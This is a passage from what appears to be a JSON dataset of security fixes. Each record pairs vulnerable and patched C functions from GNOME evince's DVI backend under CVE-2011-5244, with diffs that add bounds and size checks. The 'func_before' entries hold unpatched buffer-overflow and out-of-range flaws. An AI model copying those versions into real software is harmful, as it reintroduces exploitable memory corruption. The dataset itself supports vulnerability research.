        "func_before": "int\ttfm_load_file(const char *filename, TFMInfo *info)\n{\n\tint\tlf, lh, bc, ec, nw, nh, nd, ne;\n\tint\ti, n;\n\tUchar\t*tfm;\n\tUchar\t*ptr;\n\tstruct stat st;\n\tint\tsize;\n\tFILE\t*in;\n\tInt32\t*cb;\n\tInt32\t*charinfo;\n\tInt32\t*widths;\n\tInt32\t*heights;\n\tInt32\t*depths;\n\tUint32\tchecksum;\n\n\tin = fopen(filename, \"rb\");\n\tif(in == NULL)\n\t\treturn -1;\n\ttfm = NULL;\n\n\tDEBUG((DBG_FONTS, \"(mt) reading TFM file `%s'\\n\",\n\t\tfilename));\n\t/* We read the entire TFM file into core */\n\tif(fstat(fileno(in), &st) < 0)\n\t\treturn -1;\n\tif(st.st_size == 0)\n\t\tgoto bad_tfm;\n\n\t/* allocate a word-aligned buffer to hold the file */\n\tsize = 4 * ROUND(st.st_size, 4);\n\tif(size != st.st_size)\n\t\tmdvi_warning(_(\"Warning: TFM file `%s' has suspicious size\\n\"), \n\t\t\t     filename);\n\ttfm = (Uchar *)mdvi_malloc(size);\n\tif(fread(tfm, st.st_size, 1, in) != 1)\n\t\tgoto error;\n\t/* we don't need this anymore */\n\tfclose(in);\n\tin = NULL;\n\n\t/* not a checksum, but serves a similar purpose */\n\tchecksum = 0;\n\t\n\tptr = tfm;\n\t/* get the counters */\n\tlf = muget2(ptr);\n\tlh = muget2(ptr); checksum += 6 + lh;\n\tbc = muget2(ptr); \n\tec = muget2(ptr); checksum += ec - bc + 1;\n\tnw = muget2(ptr); checksum += nw;\n\tnh = muget2(ptr); checksum += nh;\n\tnd = muget2(ptr); checksum += nd;\n\tchecksum += muget2(ptr); /* skip italics correction count */\n\tchecksum += muget2(ptr); /* skip lig/kern table size */\n\tchecksum += muget2(ptr); /* skip kern table size */\n\tne = muget2(ptr); checksum += ne;\n\tchecksum += muget2(ptr); /* skip # of font parameters */\n\n\tsize = ec - bc + 1;\n\tcb = (Int32 *)tfm; cb += 6 + lh;\n\tcharinfo    = cb;  cb += size;\n\twidths      = cb;  cb += nw;\n\theights     = cb;  cb += nh;\n\tdepths      = cb;\n\n\tif(widths[0] || heights[0] || depths[0] || \n\t   checksum != lf || bc - 1 > ec || ec > 255 || ne > 256)\n\t\tgoto bad_tfm;\n\n\t/* from this point on, no error checking is done */\n\n\t/* now we're at the header */\n\t/* get the checksum */\n\tinfo->checksum = muget4(ptr);\n\t/* get the design size */\n\tinfo->design = muget4(ptr);\n\t/* get the coding scheme */\n\tif(lh > 2) {\n\t\t/* get the coding scheme */\n\t\ti = n = msget1(ptr);\n\t\tif(n < 0 || n > 39) {\n\t\t\tmdvi_warning(_(\"%s: font coding scheme truncated to 40 bytes\\n\"),\n\t\t\t\t     filename);\n\t\t\tn = 39;\n\t\t}\n\t\tmemcpy(info->coding, ptr, n);\n\t\tinfo->coding[n] = 0;\n\t\tptr += i;\n\t} else\n\t\tstrcpy(info->coding, \"FontSpecific\");\n\t/* get the font family */\n\tif(lh > 12) {\n\t\tn = msget1(ptr);\n\t\tif(n > 0) {\n\t\t\ti = Max(n, 63);\n\t\t\tmemcpy(info->family, ptr, i);\n\t\t\tinfo->family[i] = 0;\n\t\t} else\n\t\t\tstrcpy(info->family, \"unspecified\");\n\t\tptr += n;\n\t}\n\t/* now we don't read from `ptr' anymore */\n\t\n\tinfo->loc = bc;\n\tinfo->hic = ec;\n\tinfo->type = DviFontTFM;\n\n\t/* allocate characters */\n\tinfo->chars = xnalloc(TFMChar, size);\n\n\n#ifdef WORD_LITTLE_ENDIAN\n\t/* byte-swap the three arrays at once (they are consecutive in memory) */\n\tswap_array((Uint32 *)widths, nw + nh + nd);\n#endif\n\n\t/* get the relevant data */\n\tptr = (Uchar *)charinfo;\n\tfor(i = bc; i <= ec; ptr += 3, i++) {\n\t\tint\tndx;\n\n\t\tndx = (int)*ptr; ptr++;\n\t\tinfo->chars[i-bc].advance = widths[ndx];\n\t\t/* TFM files lack this information */\n\t\tinfo->chars[i-bc].left = 0;\n\t\tinfo->chars[i-bc].right = widths[ndx];\n\t\tinfo->chars[i-bc].present = (ndx != 0);\n\t\tif(ndx) {\n\t\t\tndx = ((*ptr >> 4) & 0xf);\n\t\t\tinfo->chars[i-bc].height = heights[ndx];\n\t\t\tndx = (*ptr & 0xf);\n\t\t\tinfo->chars[i-bc].depth = depths[ndx];\n\t\t}\n\t}\n\n\t/* free everything */\n\tmdvi_free(tfm);\n\t\n\treturn 0;\n\nbad_tfm:\n\tmdvi_error(_(\"%s: File corrupted, or not a TFM file\\n\"), filename);\nerror:\n\tif(tfm) mdvi_free(tfm);\n\tif(in)  fclose(in);\n\treturn -1;\t\n}",
        "func": "int\ttfm_load_file(const char *filename, TFMInfo *info)\n{\n\tint\tlf, lh, bc, ec, nw, nh, nd, ne;\n\tint\ti, n;\n\tUchar\t*tfm;\n\tUchar\t*ptr;\n\tstruct stat st;\n\tint\tsize;\n\tFILE\t*in;\n\tInt32\t*cb;\n\tInt32\t*charinfo;\n\tInt32\t*widths;\n\tInt32\t*heights;\n\tInt32\t*depths;\n\tUint32\tchecksum;\n\n\tin = fopen(filename, \"rb\");\n\tif(in == NULL)\n\t\treturn -1;\n\ttfm = NULL;\n\n\tDEBUG((DBG_FONTS, \"(mt) reading TFM file `%s'\\n\",\n\t\tfilename));\n\t/* We read the entire TFM file into core */\n\tif(fstat(fileno(in), &st) < 0)\n\t\treturn -1;\n\t/* according to the spec, TFM files are smaller than 16K */\n\tif(st.st_size == 0 || st.st_size >= 16384)\n\t\tgoto bad_tfm;\n\n\t/* allocate a word-aligned buffer to hold the file */\n\tsize = 4 * ROUND(st.st_size, 4);\n\tif(size != st.st_size)\n\t\tmdvi_warning(_(\"Warning: TFM file `%s' has suspicious size\\n\"), \n\t\t\t     filename);\n\ttfm = (Uchar *)mdvi_malloc(size);\n\tif(fread(tfm, st.st_size, 1, in) != 1)\n\t\tgoto error;\n\t/* we don't need this anymore */\n\tfclose(in);\n\tin = NULL;\n\n\t/* not a checksum, but serves a similar purpose */\n\tchecksum = 0;\n\t\n\tptr = tfm;\n\t/* get the counters */\n\tlf = muget2(ptr);\n\tlh = muget2(ptr); checksum += 6 + lh;\n\tbc = muget2(ptr); \n\tec = muget2(ptr); checksum += ec - bc + 1;\n\tnw = muget2(ptr); checksum += nw;\n\tnh = muget2(ptr); checksum += nh;\n\tnd = muget2(ptr); checksum += nd;\n\tchecksum += muget2(ptr); /* skip italics correction count */\n\tchecksum += muget2(ptr); /* skip lig/kern table size */\n\tchecksum += muget2(ptr); /* skip kern table size */\n\tne = muget2(ptr); checksum += ne;\n\tchecksum += muget2(ptr); /* skip # of font parameters */\n\n\tsize = ec - bc + 1;\n\tcb = (Int32 *)tfm; cb += 6 + lh;\n\tcharinfo    = cb;  cb += size;\n\twidths      = cb;  cb += nw;\n\theights     = cb;  cb += nh;\n\tdepths      = cb;\n\n\tif(widths[0] || heights[0] || depths[0] || \n\t   checksum != lf || bc - 1 > ec || ec > 255 || ne > 256)\n\t\tgoto bad_tfm;\n\n\t/* from this point on, no error checking is done */\n\n\t/* now we're at the header */\n\t/* get the checksum */\n\tinfo->checksum = muget4(ptr);\n\t/* get the design size */\n\tinfo->design = muget4(ptr);\n\t/* get the coding scheme */\n\tif(lh > 2) {\n\t\t/* get the coding scheme */\n\t\ti = n = msget1(ptr);\n\t\tif(n < 0 || n > 39) {\n\t\t\tmdvi_warning(_(\"%s: font coding scheme truncated to 40 bytes\\n\"),\n\t\t\t\t     filename);\n\t\t\tn = 39;\n\t\t}\n\t\tmemcpy(info->coding, ptr, n);\n\t\tinfo->coding[n] = 0;\n\t\tptr += i;\n\t} else\n\t\tstrcpy(info->coding, \"FontSpecific\");\n\t/* get the font family */\n\tif(lh > 12) {\n\t\tn = msget1(ptr);\n\t\tif(n > 0) {\n\t\t\ti = Max(n, 63);\n\t\t\tmemcpy(info->family, ptr, i);\n\t\t\tinfo->family[i] = 0;\n\t\t} else\n\t\t\tstrcpy(info->family, \"unspecified\");\n\t\tptr += n;\n\t}\n\t/* now we don't read from `ptr' anymore */\n\t\n\tinfo->loc = bc;\n\tinfo->hic = ec;\n\tinfo->type = DviFontTFM;\n\n\t/* allocate characters */\n\tinfo->chars = xnalloc(TFMChar, size);\n\n\n#ifdef WORD_LITTLE_ENDIAN\n\t/* byte-swap the three arrays at once (they are consecutive in memory) */\n\tswap_array((Uint32 *)widths, nw + nh + nd);\n#endif\n\n\t/* get the relevant data */\n\tptr = (Uchar *)charinfo;\n\tfor(i = bc; i <= ec; ptr += 3, i++) {\n\t\tint\tndx;\n\n\t\tndx = (int)*ptr; ptr++;\n\t\tinfo->chars[i-bc].advance = widths[ndx];\n\t\t/* TFM files lack this information */\n\t\tinfo->chars[i-bc].left = 0;\n\t\tinfo->chars[i-bc].right = widths[ndx];\n\t\tinfo->chars[i-bc].present = (ndx != 0);\n\t\tif(ndx) {\n\t\t\tndx = ((*ptr >> 4) & 0xf);\n\t\t\tinfo->chars[i-bc].height = heights[ndx];\n\t\t\tndx = (*ptr & 0xf);\n\t\t\tinfo->chars[i-bc].depth = depths[ndx];\n\t\t}\n\t}\n\n\t/* free everything */\n\tmdvi_free(tfm);\n\t\n\treturn 0;\n\nbad_tfm:\n\tmdvi_error(_(\"%s: File corrupted, or not a TFM file\\n\"), filename);\nerror:\n\tif(tfm) mdvi_free(tfm);\n\tif(in)  fclose(in);\n\treturn -1;\t\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,7 +24,8 @@\n \t/* We read the entire TFM file into core */\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t/* according to the spec, TFM files are smaller than 16K */\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t/* allocate a word-aligned buffer to hold the file */",
        "diff_line_info": {
            "deleted_lines": [
                "\tif(st.st_size == 0)"
            ],
            "added_lines": [
                "\t/* according to the spec, TFM files are smaller than 16K */",
                "\tif(st.st_size == 0 || st.st_size >= 16384)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/vf_load_font",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static int vf_load_font(DviParams *params, DviFont *font)\n{\n\tFILE\t*p;\n\tUchar\t*macros;\n\tint\tmsize;\n\tint\tmlen;\n\tInt32\tchecksum;\n\tlong\talpha, beta, z;\n\tint\top;\n\tint\ti;\n\tint\tnchars;\n\tint\tloc, hic;\n\tDviFontRef *last;\n\t\n\tmacros = NULL;\n\tmsize = mlen = 0;\n\tp = font->in;\n\t\n\tif(fuget1(p) != 247 || fuget1(p) != 202)\n\t\tgoto badvf;\n\tmlen = fuget1(p);\n\tfseek(p, (long)mlen, SEEK_CUR);\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && checksum != font->checksum) {\n\t\tmdvi_warning(_(\"%s: Checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\tfont->design = fuget4(p);\n\t\n\t/* read all the fonts in the preamble */\n\tlast = NULL;\n\n\t/* initialize alpha, beta and z for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\top = fuget1(p);\t\n\twhile(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4) {\n\t\tDviFontRef *ref;\n\t\tInt32\tscale, design;\n\t\tUint32\tchecksum;\n\t\tint\tid;\n\t\tint\tn;\n\t\tint\thdpi;\n\t\tint\tvdpi;\n\t\tchar\t*name;\n\t\t\n\t\t/* process fnt_def commands */\n\t\t\n\t\tid = fugetn(p, op - DVI_FNT_DEF1 + 1);\n\t\tchecksum = fuget4(p);\n\t\tscale = fuget4(p);\n\t\tdesign = fuget4(p);\n\n\t\t/* scale this font according to our parent's scale */\n\t\tscale = TFMSCALE(scale, z, alpha, beta);\n\t\tdesign = FROUND(params->tfm_conv * design);\n\n\t\t/* compute the resolution */\n\t\thdpi = FROUND(params->mag * params->dpi * scale / design);\n\t\tvdpi = FROUND(params->mag * params->vdpi * scale / design);\n\t\tn = fuget1(p) + fuget1(p);\n\t\tname = mdvi_malloc(n + 1);\n\t\tfread(name, 1, n, p);\n\t\tname[n] = 0;\n\t\tDEBUG((DBG_FONTS, \"(vf) %s: defined font `%s' at %.1fpt (%dx%d dpi)\\n\",\n\t\t\tfont->fontname, name, \n\t\t\t(double)scale / (params->tfm_conv * 0x100000), hdpi, vdpi));\n\n\t\t/* get the font */\n\t\tref = font_reference(params, id, name, checksum, hdpi, vdpi, scale);\n\t\tif(ref == NULL) {\n\t\t\tmdvi_error(_(\"(vf) %s: could not load font `%s'\\n\"), \n\t\t\t\t   font->fontname, name);\n\t\t\tgoto error;\n\t\t}\n\t\tmdvi_free(name);\n\t\tif(last == NULL)\n\t\t\tfont->subfonts = last = ref;\n\t\telse\n\t\t\tlast->next = ref;\n\t\tref->next = NULL;\n\t\top = fuget1(p);\n\t}\n\t\n\tif(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4)\n\t\tgoto error;\n\n\t/* This function correctly reads both .vf and .ovf files */\n\t\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\tnchars = 256;\n\tloc = -1; hic = -1;\n\t/* now read the characters themselves */\n\twhile(op <= 242) {\n\t\tint\tpl;\n\t\tInt32\tcc;\n\t\tInt32\ttfm;\n\t\t\n\t\tif(op == 242) {\n\t\t\tpl = fuget4(p);\n\t\t\tcc = fuget4(p);\n\t\t\ttfm = fuget4(p);\n\t\t} else {\n\t\t\tpl = op;\n\t\t\tcc = fuget1(p);\n\t\t\ttfm = fuget3(p);\n\t\t}\n\t\tif(loc < 0 || cc < loc)\n\t\t\tloc = cc;\n\t\tif(hic < 0 || cc > hic)\n\t\t\thic = cc;\n\t\tif(cc >= nchars) {\n\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\tDviFontChar, cc + 16);\n\t\t\tfor(i = nchars; i < cc + 16; i++)\n\t\t\t\tfont->chars[i].offset = 0;\n\t\t\tnchars = cc + 16;\n\t\t}\n\t\tif(font->chars[cc].offset) {\n\t\t\tmdvi_error(_(\"(vf) %s: character %d redefined\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\t\t\t\n\t\tDEBUG((DBG_GLYPHS, \"(vf) %s: defined character %d (macro length %d)\\n\",\n\t\t\tfont->fontname, cc, pl));\n\t\tfont->chars[cc].width = pl + 1;\n\t\tfont->chars[cc].code = cc;\n\t\tfont->chars[cc].tfmwidth = TFMSCALE(tfm, z, alpha, beta);\n\t\tfont->chars[cc].offset = mlen;\n\t\tfont->chars[cc].loaded = 1;\n\t\tif(mlen + pl + 1 > msize) {\n\t\t\tmsize = mlen + pl + 256;\n\t\t\tmacros = xresize(macros, Uchar, msize);\n\t\t}\n\t\tif(pl && fread(macros + mlen, 1, pl, p) != pl)\n\t\t\tbreak;\n\t\tmacros[mlen+pl] = DVI_EOP;\n\t\tmlen += pl + 1;\n\t\top = fuget1(p);\n\t}\n\tif(op != 248) {\n\t\tmdvi_error(_(\"(vf) %s: no postamble\\n\"), font->fontname);\n\t\tgoto error;\n\t}\n\n\t/* make macro memory just big enough */\n\tif(msize > mlen) {\n\t\tmacros = xresize(macros, Uchar, mlen);\n\t\tmsize = mlen;\n\t}\n\t\n\tDEBUG((DBG_FONTS|DBG_GLYPHS, \n\t\t\"(vf) %s: macros use %d bytes\\n\", font->fontname, msize));\n\n\tif(loc > 0 || hic < nchars-1) {\n\t\tmemmove(font->chars, font->chars + loc,\n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\n\tfont->private = macros;\n\n\treturn 0;\n\t\nbadvf:\n\tmdvi_error(_(\"%s: File corrupted, or not a VF file.\\n\"), font->fontname);\nerror:\n\tif(font->chars)\n\t\tmdvi_free(font->chars);\n\tif(macros)\n\t\tmdvi_free(macros);\n\treturn -1;\n}",
        "func": "static int vf_load_font(DviParams *params, DviFont *font)\n{\n\tFILE\t*p;\n\tUchar\t*macros;\n\tint\tmsize;\n\tint\tmlen;\n\tInt32\tchecksum;\n\tlong\talpha, beta, z;\n\tint\top;\n\tint\ti;\n\tint\tnchars;\n\tint\tloc, hic;\n\tDviFontRef *last;\n\t\n\tmacros = NULL;\n\tmsize = mlen = 0;\n\tp = font->in;\n\t\n\tif(fuget1(p) != 247 || fuget1(p) != 202)\n\t\tgoto badvf;\n\tmlen = fuget1(p);\n\tfseek(p, (long)mlen, SEEK_CUR);\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && checksum != font->checksum) {\n\t\tmdvi_warning(_(\"%s: Checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\tfont->design = fuget4(p);\n\t\n\t/* read all the fonts in the preamble */\n\tlast = NULL;\n\n\t/* initialize alpha, beta and z for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\top = fuget1(p);\t\n\twhile(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4) {\n\t\tDviFontRef *ref;\n\t\tInt32\tscale, design;\n\t\tUint32\tchecksum;\n\t\tint\tid;\n\t\tint\tn;\n\t\tint\thdpi;\n\t\tint\tvdpi;\n\t\tchar\t*name;\n\t\t\n\t\t/* process fnt_def commands */\n\t\t\n\t\tid = fugetn(p, op - DVI_FNT_DEF1 + 1);\n\t\tchecksum = fuget4(p);\n\t\tscale = fuget4(p);\n\t\tdesign = fuget4(p);\n\n\t\t/* scale this font according to our parent's scale */\n\t\tscale = TFMSCALE(scale, z, alpha, beta);\n\t\tdesign = FROUND(params->tfm_conv * design);\n\n\t\t/* compute the resolution */\n\t\thdpi = FROUND(params->mag * params->dpi * scale / design);\n\t\tvdpi = FROUND(params->mag * params->vdpi * scale / design);\n\t\tn = fuget1(p) + fuget1(p);\n\t\tname = mdvi_malloc(n + 1);\n\t\tfread(name, 1, n, p);\n\t\tname[n] = 0;\n\t\tDEBUG((DBG_FONTS, \"(vf) %s: defined font `%s' at %.1fpt (%dx%d dpi)\\n\",\n\t\t\tfont->fontname, name, \n\t\t\t(double)scale / (params->tfm_conv * 0x100000), hdpi, vdpi));\n\n\t\t/* get the font */\n\t\tref = font_reference(params, id, name, checksum, hdpi, vdpi, scale);\n\t\tif(ref == NULL) {\n\t\t\tmdvi_error(_(\"(vf) %s: could not load font `%s'\\n\"), \n\t\t\t\t   font->fontname, name);\n\t\t\tgoto error;\n\t\t}\n\t\tmdvi_free(name);\n\t\tif(last == NULL)\n\t\t\tfont->subfonts = last = ref;\n\t\telse\n\t\t\tlast->next = ref;\n\t\tref->next = NULL;\n\t\top = fuget1(p);\n\t}\n\t\n\tif(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4)\n\t\tgoto error;\n\n\t/* This function correctly reads both .vf and .ovf files */\n\t\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\tnchars = 256;\n\tloc = -1; hic = -1;\n\t/* now read the characters themselves */\n\twhile(op <= 242) {\n\t\tint\tpl;\n\t\tInt32\tcc;\n\t\tInt32\ttfm;\n\t\t\n\t\tif(op == 242) {\n\t\t\tpl = fuget4(p);\n\t\t\tcc = fuget4(p);\n\t\t\ttfm = fuget4(p);\n\t\t} else {\n\t\t\tpl = op;\n\t\t\tcc = fuget1(p);\n\t\t\ttfm = fuget3(p);\n\t\t}\n\t\tif (cc < 0 || cc > 65536) {\n\t\t\t/* TeX engines do not support char codes bigger than 65535 */\n\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\tif(loc < 0 || cc < loc)\n\t\t\tloc = cc;\n\t\tif(hic < 0 || cc > hic)\n\t\t\thic = cc;\n\t\tif(cc >= nchars) {\n\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\tDviFontChar, cc + 16);\n\t\t\tfor(i = nchars; i < cc + 16; i++)\n\t\t\t\tfont->chars[i].offset = 0;\n\t\t\tnchars = cc + 16;\n\t\t}\n\t\tif(font->chars[cc].offset) {\n\t\t\tmdvi_error(_(\"(vf) %s: character %d redefined\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\t\t\t\n\t\tDEBUG((DBG_GLYPHS, \"(vf) %s: defined character %d (macro length %d)\\n\",\n\t\t\tfont->fontname, cc, pl));\n\t\tfont->chars[cc].width = pl + 1;\n\t\tfont->chars[cc].code = cc;\n\t\tfont->chars[cc].tfmwidth = TFMSCALE(tfm, z, alpha, beta);\n\t\tfont->chars[cc].offset = mlen;\n\t\tfont->chars[cc].loaded = 1;\n\t\tif(mlen + pl + 1 > msize) {\n\t\t\tmsize = mlen + pl + 256;\n\t\t\tmacros = xresize(macros, Uchar, msize);\n\t\t}\n\t\tif(pl && fread(macros + mlen, 1, pl, p) != pl)\n\t\t\tbreak;\n\t\tmacros[mlen+pl] = DVI_EOP;\n\t\tmlen += pl + 1;\n\t\top = fuget1(p);\n\t}\n\tif(op != 248) {\n\t\tmdvi_error(_(\"(vf) %s: no postamble\\n\"), font->fontname);\n\t\tgoto error;\n\t}\n\n\t/* make macro memory just big enough */\n\tif(msize > mlen) {\n\t\tmacros = xresize(macros, Uchar, mlen);\n\t\tmsize = mlen;\n\t}\n\t\n\tDEBUG((DBG_FONTS|DBG_GLYPHS, \n\t\t\"(vf) %s: macros use %d bytes\\n\", font->fontname, msize));\n\n\tif(loc > 0 || hic < nchars-1) {\n\t\tmemmove(font->chars, font->chars + loc,\n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\n\tfont->private = macros;\n\n\treturn 0;\n\t\nbadvf:\n\tmdvi_error(_(\"%s: File corrupted, or not a VF file.\\n\"), font->fontname);\nerror:\n\tif(font->chars)\n\t\tmdvi_free(font->chars);\n\tif(macros)\n\t\tmdvi_free(macros);\n\treturn -1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -108,6 +108,12 @@\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t/* TeX engines do not support char codes bigger than 65535 */\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (cc < 0 || cc > 65536) {",
                "\t\t\t/* TeX engines do not support char codes bigger than 65535 */",
                "\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),",
                "\t\t\t\t   font->fontname, cc);",
                "\t\t\tgoto error;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/token",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static char *token(FILE *stream)\n{\n    int ch, idx;\n\n    /* skip over white space */\n    while ((ch = fgetc(stream)) == ' ' || ch == lineterm || \n            ch == ',' || ch == '\\t' || ch == ';');\n    \n    idx = 0;\n    while (ch != EOF && ch != ' ' && ch != lineterm \n           && ch != '\\t' && ch != ':' && ch != ';') \n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n\n    if (ch == EOF && idx < 1) return ((char *)NULL);\n    if (idx >= 1 && ch != ':' ) ungetc(ch, stream);\n    if (idx < 1 ) ident[idx++] = ch;\t/* single-character token */\n    ident[idx] = 0;\n    \n    return(ident);\t/* returns pointer to the token */\n\n}",
        "func": "static char *token(FILE *stream)\n{\n    int ch, idx;\n\n    /* skip over white space */\n    while ((ch = fgetc(stream)) == ' ' || ch == lineterm || \n            ch == ',' || ch == '\\t' || ch == ';');\n    \n    idx = 0;\n    while (ch != EOF && ch != ' ' && ch != lineterm \n           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n\n    if (ch == EOF && idx < 1) return ((char *)NULL);\n    if (idx >= 1 && ch != ':' ) ungetc(ch, stream);\n    if (idx < 1 ) ident[idx++] = ch;\t/* single-character token */\n    ident[idx] = 0;\n    \n    return(ident);\t/* returns pointer to the token */\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);",
        "diff_line_info": {
            "deleted_lines": [
                "           && ch != '\\t' && ch != ':' && ch != ';') "
            ],
            "added_lines": [
                "           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/special",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "int\tspecial(DviContext *dvi, int opcode)\n{\n\tchar\t*s;\n\tInt32\targ;\n\t\n\targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n\ts = mdvi_malloc(arg + 1);\n\tdread(dvi, s, arg);\n\ts[arg] = 0;\n\tmdvi_do_special(dvi, s);\n\tSHOWCMD((dvi, \"XXXX\", opcode - DVI_XXX1 + 1,\n\t\t\"[%s]\", s));\n\tmdvi_free(s);\n\treturn 0;\n}",
        "func": "int\tspecial(DviContext *dvi, int opcode)\n{\n\tchar\t*s;\n\tInt32\targ;\n\t\n\targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n\tif (arg <= 0) {\n\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n\t\treturn -1;\n\t}\n\ts = mdvi_malloc(arg + 1);\n\tdread(dvi, s, arg);\n\ts[arg] = 0;\n\tmdvi_do_special(dvi, s);\n\tSHOWCMD((dvi, \"XXXX\", opcode - DVI_XXX1 + 1,\n\t\t\"[%s]\", s));\n\tmdvi_free(s);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,6 +4,10 @@\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tif (arg <= 0) {",
                "\t\tdvierr(dvi, _(\"malformed special length\\n\"));",
                "\t\treturn -1;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/pk_load_font",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
